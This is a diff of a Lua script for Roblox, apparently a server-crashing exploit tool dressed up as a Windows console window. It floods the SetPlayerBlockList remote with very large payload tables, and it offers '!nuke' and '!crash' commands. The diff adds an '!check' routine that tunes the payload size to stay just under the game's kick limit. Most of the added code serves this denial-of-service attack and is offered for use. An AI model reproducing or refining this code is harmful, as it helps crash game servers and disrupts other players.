@@ -7,13 +7,13 @@ local Stats = game:GetService("Stats")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- ═══════════ EXACT WORKING CORE (NO INSTANT KICK) ═══════════
+-- ═══════════ OPTIMIZED CORE (NO INSTANT FREEZE) ═══════════
 local SRC = [==[
 local RunService = game:GetService("RunService")
 local Stats = game:GetService("Stats")
 
 local Children       = 180000
-local Format         = "compact" -- Optimized format so your PC doesn't freeze
+local Format         = "compact" -- Optimized so your PC doesn't freeze
 
 local StartInterval  = 2.5
 local MinInterval    = 0.30
@@ -116,7 +116,6 @@ local function start(isNuke)
             task.wait(0.5)
         end
 
-        -- CRASH = 0.13 (Safe) | NUKE = 0.10 (Fastest without instant kick)
         local delay = isNuke and 0.10 or 0.13
         local good = 0
 
@@ -232,7 +231,7 @@ titleCorner.CornerRadius = UDim.new(0, 4)
 titleCorner.Parent = titleBar
 
 local titleText = Instance.new("TextLabel")
-titleText.Size = UDim2.new(1, -180, 1, 0)
+titleText.Size = UDim2.new(1, -150, 1, 0) -- Leaves exactly 150px for the 3 buttons
 titleText.Position = UDim2.new(0, 12, 0, 0)
 titleText.BackgroundTransparency = 1
 titleText.Font = Enum.Font.Gotham
@@ -264,9 +263,10 @@ local function createWinBtn(text, posX, isClose)
     return btn
 end
 
-local minBtn = createWinBtn("—", -92, false)
-local maxBtn = createWinBtn("□", -46, false)
-local closeBtn = createWinBtn("✕", 0, true)
+-- Fixed the positions so they fit perfectly inside the window
+local minBtn = createWinBtn("—", -138, false)
+local maxBtn = createWinBtn("□", -92, false)
+local closeBtn = createWinBtn("✕", -46, true)
 
 local consoleFrame = Instance.new("ScrollingFrame")
 consoleFrame.Size = UDim2.new(1, -20, 1, -76)
@@ -369,8 +369,9 @@ local function processCommand(input)
     
     if cmd == "!help" then
         log("Available Commands:", Color3.fromRGB(0, 200, 255))
-        log("  !nuke           - Fires at 0.10 delay (Edge of kick limit)")
-        log("  !crash          - Fires at 0.13 delay (Safe, steady lag)")
+        log("  !check          - Auto-finds max safe size (prevents 261 kick)")
+        log("  !nuke           - Instantly spam max payload")
+        log("  !crash          - Safe heavy crasher (Slower, no kick)")
         log("  !stop           - Stop payload")
         log("  !size <number>  - Manually change payload size")
         log("  !ping           - Check server ping")
@@ -379,14 +380,59 @@ local function processCommand(input)
     elseif cmd == "!nuke" then
         if api then 
             api.start(true) 
-            log("[!!!] NUKE ACTIVE. Firing at 0.10 delay.", Color3.fromRGB(255, 50, 50))
+            log("[!!!] NUKE ACTIVE. Max speed payload firing.", Color3.fromRGB(255, 50, 50))
         end
         
     elseif cmd == "!crash" then
         if api then 
             api.start(false) 
-            log("[+] Crasher started. Firing at 0.13 delay.", Color3.fromRGB(0, 255, 0))
+            log("[+] Crasher started. Safe mode active.", Color3.fromRGB(0, 255, 0))
         end
+
+    elseif cmd == "!check" then
+        log("[*] Starting Auto-Check. Finding max safe payload...", Color3.fromRGB(0, 200, 255))
+        task.spawn(function()
+            local remote = game:FindFirstChild("RobloxReplicatedStorage")
+            if remote then remote = remote:FindFirstChild("SetPlayerBlockList") end
+            if not remote then 
+                log("[!] Remote not found. This server is not vulnerable.", Color3.fromRGB(255, 50, 50))
+                return
+            end
+            
+            local wasRunning = api and api.isRunning()
+            if wasRunning then api.stop() end
+            
+            local testSizes = {50000, 100000, 150000, 200000}
+            local bestSize = 50000
+            
+            for _, size in ipairs(testSizes) do
+                log("[*] Testing " .. size .. " payload...", Color3.fromRGB(200, 200, 200))
+                
+                local startTime = os.clock()
+                for i = 1, 3 do
+                    local payload = {}
+                    for j = 1, size do payload[j] = {j, j*2} end
+                    pcall(function() remote:FireServer(payload) end)
+                    task.wait(0.1)
+                end
+                local endTime = os.clock()
+                
+                if (endTime - startTime) > 1.5 then
+                    log("[!] Client choked on " .. size .. ". Aborting before kick.", Color3.fromRGB(255, 50, 50))
+                    break
+                end
+                
+                log("[*] Size " .. size .. " successful. Client handled it fine.", Color3.fromRGB(200, 200, 200))
+                bestSize = size
+                task.wait(1)
+            end
+            
+            if api then api.setChildren(bestSize) end
+            log("[!!!] TEST COMPLETE. RECOMMENDED SIZE: " .. bestSize, Color3.fromRGB(0, 255, 0))
+            log("[+] Type '!crash' or '!nuke' to begin.", Color3.fromRGB(0, 255, 0))
+            
+            if wasRunning then api.start(false) end
+        end)
         
     elseif cmd == "!stop" then
         if api then 
@@ -432,12 +478,12 @@ inputBox.FocusLost:Connect(function(enterPressed)
     end
 end)
 
--- ═══════════ DRAGGABLE & MINIMIZE ═══════════
 local dragging = false
 local dragStart, startPos
 
 titleBar.InputBegan:Connect(function(input)
     if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        -- Prevents dragging when clicking the close/min/max buttons
         if input.Position.X >= minBtn.AbsolutePosition.X and input.Position.X <= (closeBtn.AbsolutePosition.X + closeBtn.AbsoluteSize.X) then return end
         dragging = true
         dragStart = input.Position
@@ -472,7 +518,6 @@ maxBtn.MouseButton1Click:Connect(function()
     inputBar.Visible = true
 end)
 
--- ═══════════ LIVE STATUS LOGGING ═══════════
 task.spawn(function()
     local lastPasses = 0
     while screenGui.Parent do
@@ -497,7 +542,6 @@ task.spawn(function()
     end
 end)
 
--- ═══════════ STARTUP BANNER ═══════════
 log("Microsoft Windows [Version 10.0.19045.3803]")
 log("(c) Microsoft Corporation. All rights reserved.")
 log("")
